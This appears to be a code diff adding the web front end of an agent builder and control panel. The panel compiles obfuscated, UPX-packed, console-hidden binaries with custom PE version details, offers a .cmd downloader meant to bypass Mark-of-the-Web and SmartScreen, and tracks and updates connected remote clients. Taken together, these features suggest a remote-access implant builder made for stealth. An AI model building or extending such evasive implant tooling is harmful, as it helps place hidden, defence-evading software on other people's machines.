+              <button id="clear-builds-btn" onclick="clearAllBuilds()" title="Delete all cached build artifacts and force fresh compilations" style="display:inline-flex;align-items:center;gap:.35rem;background:rgba(239,68,68,.10);border:1px solid rgba(239,68,68,.30);color:#fca5a5;border-radius:8px;padding:.3rem .65rem;font-size:.76rem;font-weight:600;font-family:inherit;cursor:pointer;transition:background .15s;" onmouseover="this.style.background='rgba(239,68,68,.22)'" onmouseout="this.style.background='rgba(239,68,68,.10)'">
+                <i class="fa-solid fa-trash-can" style="font-size:.72rem;"></i> Clear All Builds
+              </button>
+              <button id="install-tools-btn" onclick="installToolchains()" title="Auto-install Go 1.25.0, Go 1.26.2, garble and UPX" style="display:inline-flex;align-items:center;gap:.35rem;background:rgba(99,102,241,.13);border:1px solid rgba(99,102,241,.35);color:#a5b4fc;border-radius:8px;padding:.3rem .65rem;font-size:.76rem;font-weight:600;font-family:inherit;cursor:pointer;transition:background .15s;" onmouseover="this.style.background='rgba(99,102,241,.25)'" onmouseout="this.style.background='rgba(99,102,241,.13)'">
+                <i class="fa-solid fa-screwdriver-wrench" style="font-size:.72rem;"></i> Install Toolchains
+              </button>
+            </div>
+          </div>
+
+          <div class="status-banner" id="status-banner" style="display:none;"></div>
+
+          <div class="terminal-wrap">
+            <div class="terminal" id="terminal-log"><span class="term-hint">Press Start Build to compile the agent…</span></div>
+          </div>
+
+          <div class="built-section">
+            <div class="built-header">Built Clients</div>
+            <div id="built-list">
+              <div class="built-empty" id="built-empty">No builds yet. Compiled agents will appear here.</div>
+            </div>
+          </div>
+        </div>
+
+      </div><!-- .builder-layout -->
+    </main>
+
+    <script>
+      // ── State ──────────────────────────────────────────
+      let building = false;
+      let countdownInterval = null;
+
+
+      // ── Init ───────────────────────────────────────────
+
+      async function init() {
+        const r = await fetch("/api/auth/me");
+        if (!r.ok) { window.location.href = "/login"; return; }
+        const me = await r.json();
+        document.getElementById("username-display").textContent = me.username;
+        const ROLE_LABELS = { admin: "Administrator", operator: "Operator", viewer: "Viewer" };
+        document.getElementById("role-display").textContent = ROLE_LABELS[me.role] || me.role;
+        if (me.role === "admin") {
+          document.getElementById("admin-nav-btn").style.display = "";
+          document.getElementById("settings-nav-btn").style.display = "";
+        }
+
+        // Pre-fill server URL
+        try {
+          const urlR = await fetch("/api/server-url");
+          if (urlR.ok) {
+            const { wsUrl } = await urlR.json();
+            if (wsUrl) document.getElementById("inp-url").value = wsUrl;
+          }
+        } catch {
+          const proto = location.protocol === "https:" ? "wss:" : "ws:";
+          document.getElementById("inp-url").value = `${proto}//${location.hostname}`;
+        }
+
+        // Load existing builds
+        loadBuilds();
+
+        // Goversioninfo tool status pill
+        try {
+          const sr = await fetch("/api/build/status");
+          if (sr.ok) {
+            const st = await sr.json();
+            const row = document.getElementById("vi-status-row");
+            if (row) {
+              const gvi = st.tools?.goversioninfo;
+              if (gvi) {
+                const dot = gvi.found
+                  ? `<span style="color:#34d399;">●</span>`
+                  : `<span style="color:#f87171;">●</span>`;
+                const label = gvi.found
+                  ? `<span style="color:#94a3b8;">goversioninfo <span style="color:#34d399;">ready</span></span>`
+                  : `<span style="color:#f87171;">goversioninfo not found — PE version info will be skipped. Run <code style="font-size:.7rem;background:rgba(0,0,0,.3);padding:.05rem .2rem;border-radius:3px;">go install github.com/josephspurrier/goversioninfo/cmd/goversioninfo@latest</code></span>`;
+                row.innerHTML = `${dot} ${label}`;
+                row.style.display = "flex";
+              }
+            }
+          }
+        } catch { /* non-fatal */ }
+      }
+
+      // ── Collapsible sections ───────────────────────────
+      function toggleSection(id) {
+        const body = document.getElementById("body-" + id);
+        const chev = document.getElementById("chevron-" + id);
+        body.classList.toggle("hidden");
+        chev.classList.toggle("collapsed");
+      }
+
+      // ── Terminal helpers ───────────────────────────────
+      function termClear() {
+        document.getElementById("terminal-log").innerHTML = "";
+      }
+      function termAppend(html) {
+        const t = document.getElementById("terminal-log");
+        const wasAtBottom = t.scrollHeight - t.scrollTop <= t.clientHeight + 20;
+        t.innerHTML += html + "\n";
+        if (wasAtBottom) t.scrollTop = t.scrollHeight;
+      }
+      function termLine(text, cls) {
+        const span = cls ? `<span class="${cls}">${escHtml(text)}</span>` : escHtml(text);
+        termAppend(span);
+      }
+      function termUpdateLast(text, cls) {
+        // Replace the last line in the terminal with updated text (used for live progress)
+        const t = document.getElementById("terminal-log");
+        const lines = t.innerHTML.split("\n");
+        // Remove trailing empty entries from the split
+        while (lines.length && lines[lines.length - 1].trim() === "") lines.pop();
+        if (lines.length) {
+          lines[lines.length - 1] = cls ? `<span class="${cls}">${escHtml(text)}</span>` : escHtml(text);
+          t.innerHTML = lines.join("\n") + "\n";
+        } else {
+          termLine(text, cls);
+        }
+        t.scrollTop = t.scrollHeight;
+      }
+      function escHtml(s) {
+        return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+      }
+
+      // ── Status banner ──────────────────────────────────
+      function showBanner(type, html) {
+        const b = document.getElementById("status-banner");
+        b.className = "status-banner " + type;
+        b.innerHTML = html;
+        b.style.display = "flex";
+      }
+      function hideBanner() {
+        document.getElementById("status-banner").style.display = "none";
+      }
+
+      // ── Build flow ─────────────────────────────────────
+      async function startBuild(updateAll) {
+        if (building) return;
+
+        const platforms = [...document.querySelectorAll(".plat-chk:checked")].map(c => c.value);
+        if (!platforms.length) {
+          alert("Select at least one platform.");
+          return;
+        }
+
+        const serverURL = document.getElementById("inp-url").value.trim();
+        if (!serverURL) {
+          document.getElementById("inp-url").focus();
+          document.getElementById("inp-url").style.borderColor = "#ef4444";
+          setTimeout(() => { document.getElementById("inp-url").style.borderColor = ""; }, 2000);
+          return;
+        }
+
+        const buildTag    = document.getElementById("inp-tag").value.trim();
+        const hideConsole = document.getElementById("opt-hide").checked;
+        const plainBuild   = document.getElementById("opt-plain")?.checked ?? false;
+        const noBootstrap  = document.getElementById("opt-no-bootstrap")?.checked ?? false;
+        const outTypeEl   = document.querySelector(".out-type-radio:checked");
+        const outputType  = outTypeEl ? outTypeEl.value : "exe";
+
+        building = true;
+        setBuildingState(true);
+        termClear();
+        hideBanner();
+
+        showBanner("building", `<i class="fa-solid fa-circle-notch fa-spin"></i>&nbsp; Building ${platforms.length} platform${platforms.length > 1 ? "s" : ""}…`);
+
+        const ts = new Date().toLocaleTimeString();
+        termLine(`[${ts}] Starting build process…`, "t-dim");
+        termLine(`Build ID: generating…`, "t-dim");
+        termLine(`Building for platforms: ${platforms.map(p => p.replace("|", "-")).join(", ")}`, "t-bold");
+        termLine("", "");
+
+        let successCount = 0;
+        let failCount = 0;
+
+        for (const platVal of platforms) {
+          const [osName, arch] = platVal.split("|");
+          const platLabel = `${osName}-${arch}`;
+
+          termLine(`  ⟶  ${platLabel}`, "t-dim");
+
+          try {
+            // bat is Windows-only; for other platforms fall back to exe
+            const isWin = osName === "windows";
+            if (!isWin && outputType === "bat") {
+              termLine(`     [SKIP] ${platLabel}: BAT is Windows-only — skipping non-Windows platform`, "t-dim");
+              continue;
+            }
+            const reqFormat = isWin ? outputType : "exe";
+
+            // Use async mode: server returns a jobId immediately; we poll until done.
+            // This avoids proxy/browser connection timeouts on long garble builds.
+            const POLL_TIMEOUT_MS = 10 * 60 * 1000; // 10 min hard cap
+            const POLL_INTERVAL_MS = 2500;
+
+            const startRes = await fetch("/api/build/agent", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                async: true,
+                os: osName,
+                arch,
+                serverURL,
+                buildTag,
+                hideConsole,
+                plainBuild,
+                noBootstrap,
+                format: reqFormat,
+                vi: {
+                  productName:     document.getElementById("vi-product")?.value.trim() || "",
+                  companyName:     document.getElementById("vi-company")?.value.trim() || "",
+                  fileDescription: document.getElementById("vi-desc")?.value.trim()    || "",
+                },
+              }),
+            });
+
+            if (!startRes.ok) {
+              const err = await startRes.json().catch(() => ({}));
+              const msg = err.details || err.error || `HTTP ${startRes.status}`;
+              termLine(`     [FAIL] ${platLabel}: ${msg}`, "t-err");
+              failCount++;
+              continue;
+            }
+
+            const startData = await startRes.json();
+            if (!startData.ok || !startData.jobId) {
+              termLine(`     [FAIL] ${platLabel}: ${startData.error || "Build start failed"}`, "t-err");
+              failCount++;
+              continue;
+            }
+
+            // Poll for completion
+            const jobId = startData.jobId;
+            const deadline = Date.now() + POLL_TIMEOUT_MS;
+            let data = null;
+            let elapsed = 0;
+
+            while (Date.now() < deadline) {
+              await new Promise(r => setTimeout(r, POLL_INTERVAL_MS));
+              elapsed = Math.round((Date.now() - (deadline - POLL_TIMEOUT_MS)) / 1000);
+
+              let pollRes;
+              try {
+                pollRes = await fetch(`/api/build/job/${jobId}`);
+              } catch {
+                continue; // transient network error — keep polling
+              }
+              if (!pollRes.ok) continue;
+
+              const job = await pollRes.json().catch(() => null);
+              if (!job) continue;
+
+              if (job.status === "building") {
+                // Update the last terminal line with elapsed time
+                termUpdateLast(`  ⟶  ${platLabel}  (${elapsed}s…)`, "t-dim");
+                continue;
+              }
+
+              if (job.status === "done" && job.result) {
+                data = job.result;
+                break;
+              }
+              if (job.status === "failed") {
+                termLine(`     [FAIL] ${platLabel}: ${job.error || "Build failed"}`, "t-err");
+                failCount++;
+                data = null;
+                break;
+              }
+            }
+
+            if (data === null && Date.now() >= deadline) {
+              termLine(`     [FAIL] ${platLabel}: Timed out (>10 min). Try again — subsequent builds are faster.`, "t-err");
+              failCount++;
+              continue;
+            }
+            if (!data) continue; // already counted as failure above
+
+            if (!data.ok) {
+              termLine(`     [FAIL] ${platLabel}: ${data.error || "unknown error"}`, "t-err");
+              failCount++;
+              continue;
+            }
+
+            termLine(`     [OK] ${data.filename}`, "t-ok");
+            termLine(`     Build ID: ${data.buildId}`, "t-id");
+            successCount++;
+
+            // Add to built list immediately
+            prependBuildEntry(data);
+
+          } catch (ex) {
+            const msg = String(ex.message || ex);
+            termLine(`     [FAIL] ${platLabel}: ${msg}`, "t-err");
+            failCount++;
+          }
+        }
+
+        termLine("", "");
+        const doneTs = new Date().toLocaleTimeString();
+
+        if (failCount === 0) {
+          termLine(`[${doneTs}] Build completed successfully!`, "t-ok");
+          showBanner("success", `<i class="fa-solid fa-check-circle"></i>&nbsp; Build completed successfully! ${successCount} binary${successCount !== 1 ? "ies" : ""} ready.`);
+        } else if (successCount === 0) {
+          termLine(`[${doneTs}] Build failed for all platforms.`, "t-err");
+          showBanner("error", `<i class="fa-solid fa-triangle-exclamation"></i>&nbsp; All builds failed. Check the log above.`);
+        } else {
+          termLine(`[${doneTs}] Partial: ${successCount} succeeded, ${failCount} failed.`, "t-warn");
+          showBanner("building", `<i class="fa-solid fa-triangle-exclamation"></i>&nbsp; Partial success: ${successCount} ok, ${failCount} failed.`);
+        }
+
+        if (updateAll && successCount > 0) {
+          termLine("", "");
+          termLine("  Sending update signal to connected clients…", "t-dim");
+          termLine("  (Connected clients will receive updates on next check-in)", "t-dim");
+        }
+
+        building = false;
+        setBuildingState(false);
+      }
+
+      function setBuildingState(on) {
+        document.getElementById("btn-start").disabled = on;
+        document.getElementById("btn-update-all").disabled = on;
+      }
+
+      // ── Build history ──────────────────────────────────
+      async function loadBuilds() {
+        try {
+          const r = await fetch("/api/builds");
+          if (!r.ok) return;
+          const builds = await r.json();
+          const list = document.getElementById("built-list");
+          // Clear existing entries (keep empty placeholder)
+          list.querySelectorAll(".build-entry").forEach(el => el.remove());
+          for (const b of builds) {
+            appendBuildEntry(b, false);
+          }
+          updateEmptyState();
+          startCountdownUpdater();
+        } catch {}
+      }
+
+      function prependBuildEntry(b) {
+        document.getElementById("built-empty").style.display = "none";
+        const list = document.getElementById("built-list");
+        const el = buildEntryEl(b);
+        list.insertBefore(el, list.firstChild);
+        startCountdownUpdater();
+      }
+
+      function appendBuildEntry(b, updateEmpty) {
+        document.getElementById("built-empty").style.display = "none";
+        const list = document.getElementById("built-list");
+        list.appendChild(buildEntryEl(b));
+        if (updateEmpty !== false) updateEmptyState();
+      }
+
+      function buildEntryEl(b) {
+        // Normalize: API returns 'buildId' on fresh builds, 'id' on stored builds
+        if (!b.id && b.buildId) b.id = b.buildId;
+        const div = document.createElement("div");
+        div.className = "build-entry";
+        div.dataset.id = b.id;
+        div.dataset.expires = b.expires;
+
+        const shortId = b.id.slice(0, 8);
+        const dateStr = new Date(b.created_at).toLocaleDateString(undefined, { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" });
+        const ttlHtml = formatTtl(b.expires);
+
+        const shaSnip  = b.sha256 ? escHtml(b.sha256.slice(0, 10)) + "…" : "";
+        div.innerHTML = `
+          <div class="build-entry-top">
+            <span class="build-id">${shortId}…</span>
+            <span class="build-date">${dateStr}</span>
+            ${shaSnip ? `<span class="build-sha" title="SHA-256: ${escHtml(b.sha256)}">${shaSnip}</span>` : ""}
+            <span class="build-ttl" id="ttl-${b.id}">${ttlHtml}</span>
+            <button class="build-delete-btn" onclick="deleteBuild('${b.id}', this)">
+              <i class="fa-solid fa-trash"></i>
+            </button>
+          </div>
+          <div class="build-file-row">
+            <span class="build-filename">${escHtml(b.filename)}</span>
+            <span class="build-platform-badge">${escHtml(b.platform)}</span>
+            <span class="build-version">v${escHtml(b.version)}</span>
+            <button class="build-copy-btn" onclick="copyDlLink('${b.id}', this)" title="Copy direct download link to the agent EXE">
+              <i class="fa-solid fa-link"></i> Copy Link
+            </button>
+            <a class="build-dl-btn" href="/api/agent/install.cmd?id=${encodeURIComponent(b.id)}" download="zc-install.cmd"
+               title="Download a tiny .cmd script that uses curl.exe to fetch the agent without Mark-of-the-Web (no SmartScreen on the EXE).">
+              <i class="fa-solid fa-terminal"></i> .cmd Installer
+            </a>
+            <a class="build-dl-btn" href="/api/agent/dl?id=${encodeURIComponent(b.id)}" download="${escHtml(b.filename)}">
+              <i class="fa-solid fa-download"></i> Download
+            </a>
+          </div>`;
+        return div;
+      }
+
+      function updateEmptyState() {
+        const list = document.getElementById("built-list");
+        const hasEntries = list.querySelectorAll(".build-entry").length > 0;
+        document.getElementById("built-empty").style.display = hasEntries ? "none" : "";
+      }
+
+      async function deleteBuild(id, btn) {
+        btn.disabled = true;
+        try {
+          const r = await fetch(`/api/builds/${id}`, { method: "DELETE" });
+          if (r.ok) {
+            const entry = document.querySelector(`.build-entry[data-id="${id}"]`);
+            if (entry) entry.remove();
+            updateEmptyState();
+          } else {
+            btn.disabled = false;
+          }
+        } catch {
+          btn.disabled = false;
+        }
+      }
+
+      async function clearAllBuilds() {
+        const list = document.getElementById("built-list");
+        const count = list.querySelectorAll(".build-entry").length;
+        if (count === 0) return;
+        if (!confirm(`Delete all ${count} cached build${count === 1 ? "" : "s"}? The next build will recompile from scratch.`)) return;
+        const btn = document.getElementById("clear-builds-btn");
+        btn.disabled = true;
+        const origHtml = btn.innerHTML;
+        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin" style="font-size:.72rem;"></i> Clearing…';
+        try {
+          const r = await fetch("/api/builds", { method: "DELETE" });
+          if (r.ok) {
+            list.querySelectorAll(".build-entry").forEach(el => el.remove());
+            updateEmptyState();
+            btn.innerHTML = '<i class="fa-solid fa-check" style="font-size:.72rem;"></i> Cleared';
+            setTimeout(() => { btn.innerHTML = origHtml; btn.disabled = false; }, 2000);
+          } else {
+            btn.innerHTML = origHtml;
+            btn.disabled = false;
+          }
+        } catch {
+          btn.innerHTML = origHtml;
+          btn.disabled = false;
+        }
+      }
+
+      async function copyDlLink(id, btn) {
+        const link = `${window.location.origin}/api/agent/dl?id=${encodeURIComponent(id)}`;
+        try {
+          await navigator.clipboard.writeText(link);
+          const orig = btn.innerHTML;
+          btn.innerHTML = '<i class="fa-solid fa-check"></i> Copied!';
+          setTimeout(() => { btn.innerHTML = orig; }, 2000);
+        } catch {
+          prompt("Copy this download link:", link);
+        }
+      }
+
+      // ── Countdown ──────────────────────────────────────
+      function formatTtl(expires) {
+        const msLeft = expires - Date.now();
+        if (msLeft <= 0) return "Expired";
+        const totalSec = Math.floor(msLeft / 1000);
+        const days = Math.floor(totalSec / 86400);
+        const hours = Math.floor((totalSec % 86400) / 3600);
+        const mins  = Math.floor((totalSec % 3600) / 60);
+        if (days >= 1) return `${days}d ${hours}h`;
+        if (hours >= 1) return `${hours}h ${mins}m`;
+        return `${mins}m`;
+      }
+
+      function startCountdownUpdater() {
+        if (countdownInterval) return;
+        countdownInterval = setInterval(() => {
+          document.querySelectorAll(".build-entry").forEach(entry => {
+            const expires = parseInt(entry.dataset.expires);
+            const id = entry.dataset.id;
+            const el = document.getElementById("ttl-" + id);
+            if (!el) return;
+            const msLeft = expires - Date.now();
+            if (msLeft <= 0) {
+              entry.remove();
+              updateEmptyState();
+            } else {
+              el.textContent = formatTtl(expires);
+              const hours = msLeft / 3_600_000;
+              el.className = "build-ttl" + (hours < 24 ? " expiring" : "");
+            }
+          });
+        }, 60_000);
+      }
+
+      // ── Nav ────────────────────────────────────────────
+      function toggleNav() {
+        const panel = document.getElementById("nav-panel");
+        panel.classList.toggle("open");
+        if (panel.classList.contains("open")) {
+          window.addEventListener("scroll", () => panel.classList.remove("open"), { once: true, passive: true });
+        }
+      }
+      function closeNav()  { document.getElementById("nav-panel").classList.remove("open"); }
+      let _bellUnread = 0;
+      function applyBellState(active) {
+        const btn = document.getElementById("bell-btn");
+        if (!btn) return;
+        if (active) { btn.classList.add("bell-active"); btn.title = "Notifications on — click to mute"; }
+        else { btn.classList.remove("bell-active"); btn.title = "Notifications off — click to enable"; }
+      }
+      function toggleBell() {
+        const active = localStorage.getItem("nubyone_notifications_enabled") !== "false";
+        const next = !active;
+        localStorage.setItem("nubyone_notifications_enabled", next ? "true" : "false");
+        applyBellState(next);
+      }
+      function updateBadge(n) {
+        _bellUnread = n;
+        const badge = document.getElementById("bell-badge");
+        if (badge) { badge.textContent = n > 99 ? "99+" : String(n); badge.style.display = n > 0 ? "" : "none"; }
+      }
+      async function loadBellCount() {
+        try {
+          const data = await fetch("/api/notifications?limit=50").then(r => r.json());
+          updateBadge(Array.isArray(data) ? data.filter(n => !n.read).length : 0);
+        } catch {}
+      }
+      function showAgentToast(event, host) {
+        if (!document.getElementById("_agentToastCss")) {
+          const s = document.createElement("style"); s.id = "_agentToastCss";
+          s.textContent = "@keyframes _agIn{from{opacity:0;transform:translateX(8px)}to{opacity:1;transform:none}}";
+          document.head.appendChild(s);
+        }
+        let wrap = document.getElementById("_agentToastWrap");
+        if (!wrap) {
+          wrap = document.createElement("div"); wrap.id = "_agentToastWrap";
+          wrap.style.cssText = "position:fixed;bottom:1.2rem;right:1.2rem;z-index:10000;display:flex;flex-direction:column;gap:.35rem;align-items:flex-end;pointer-events:none;";
+          document.body.appendChild(wrap);
+        }
+        const online = event === "connect";
+        const h = (host||"agent").length > 22 ? (host||"agent").slice(0,20)+"…" : (host||"agent");
+        const el = document.createElement("div");
+        el.style.cssText = "display:inline-flex;align-items:center;gap:.4rem;padding:.28rem .65rem;border-radius:99px;font-size:.71rem;font-weight:600;font-family:inherit;background:#0a1628;border:1px solid " + (online ? "rgba(34,197,94,.45)" : "rgba(100,116,139,.3)") + ";color:" + (online ? "#4ade80" : "#94a3b8") + ";box-shadow:0 4px 20px rgba(0,0,0,.5);animation:_agIn .18s ease;white-space:nowrap;";
+        el.innerHTML = '<i class="fa-solid ' + (online ? "fa-circle-dot" : "fa-circle-xmark") + '" style="font-size:.6rem;"></i>' + (online ? "Online" : "Offline") + ": <b style='font-weight:700'>" + h + "</b>";
+        wrap.appendChild(el);
+        setTimeout(() => { el.style.transition = "opacity .2s,transform .2s"; el.style.opacity = "0"; el.style.transform = "translateX(8px)"; setTimeout(() => el.remove(), 220); }, 2500);
+      }
+      function initNotifWs() {
+        const proto = location.protocol === "https:" ? "wss:" : "ws:";
+        const ws = new WebSocket(`${proto}//${location.host}/api/notifications/ws`);
+        ws.onmessage = (e) => { try { const msg = JSON.parse(e.data); if (msg.type === "client_event") { updateBadge(_bellUnread + 1); showAgentToast(msg.event, msg.host); } } catch {} };
+        ws.onclose = () => setTimeout(initNotifWs, 3000);
+      }
+      async function logout() { await fetch("/api/auth/logout", { method: "POST" }); window.location.href = "/login"; }
+      document.addEventListener("keydown", e => { if (e.key === "Escape") closeNav(); });
+
+      // ── Install Toolchains ─────────────────────────────────────────────
+      async function installToolchains() {
+        const btn = document.getElementById("install-tools-btn");
+        const log = document.getElementById("terminal-log");
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin" style="font-size:.72rem;"></i> Installing\u2026';
+
+        log.innerHTML =
+          '<span style="color:#a78bfa">[toolchain] Starting: Go 1.25.0 \u00b7 Go 1.26.2 \u00b7 garble \u00b7 UPX</span>\n' +
+          '<span style="color:#94a3b8">[toolchain] First run takes 2\u20134 min. Do not close this page.</span>\n';
+        document.getElementById("status-banner").style.display = "none";
+
+        try {
+          const res = await fetch("/api/admin/install-toolchains", { method: "POST" });
+          if (!res.ok) {
+            const err = await res.json().catch(() => ({ error: "Request failed" }));
+            log.innerHTML += `<span style="color:#f87171">[error] ${escHtml(err.error || "Unknown")}</span>\n`;
+            return;
+          }
+          const reader = res.body.getReader();
+          const dec = new TextDecoder();
+          let buf = "";
+          outer: while (true) {
+            const { done, value } = await reader.read();
+            if (done) break;
+            buf += dec.decode(value, { stream: true });
+            const events = buf.split("\n\n");
+            buf = events.pop() ?? "";
+            for (const ev of events) {
+              if (!ev.startsWith("data: ")) continue;
+              let obj;
+              try { obj = JSON.parse(ev.slice(6)); } catch { obj = ev.slice(6); }
+              if (typeof obj === "object" && obj !== null) {
+                if (obj.done) {
+                  const ok = obj.code === 0;
+                  log.innerHTML += `<span style="color:${ok ? "#34d399" : "#f87171"}">[toolchain] ${ok ? "\u2713 Done \u2014 toolchains installed. Retry your build." : "\u26a0 Finished with errors \u2014 check network and retry."}</span>\n`;
+                  break outer;
+                }
+                if (obj.error) {
+                  log.innerHTML += `<span style="color:#f87171">[error] ${escHtml(obj.error)}</span>\n`;
+                  break outer;
+                }
+              } else {
+                log.innerHTML += escHtml(String(obj)) + "\n";
+              }
+              log.scrollTop = log.scrollHeight;
+            }
+          }
+        } catch (e) {
+          log.innerHTML += `<span style="color:#f87171">[error] ${escHtml(e.message)}</span>\n`;
+        } finally {
+          btn.disabled = false;
+          btn.innerHTML = '<i class="fa-solid fa-screwdriver-wrench" style="font-size:.72rem;"></i> Install Toolchains';
+          log.scrollTop = log.scrollHeight;
+        }
+      }
+
+      init();
+      applyBellState(localStorage.getItem("nubyone_notifications_enabled") !== "false");
+      loadBellCount();
+      initNotifWs();
+    </script>
+    <script src="/assets/notif-drawer.js"></script>
+
+  </body>
+</html>
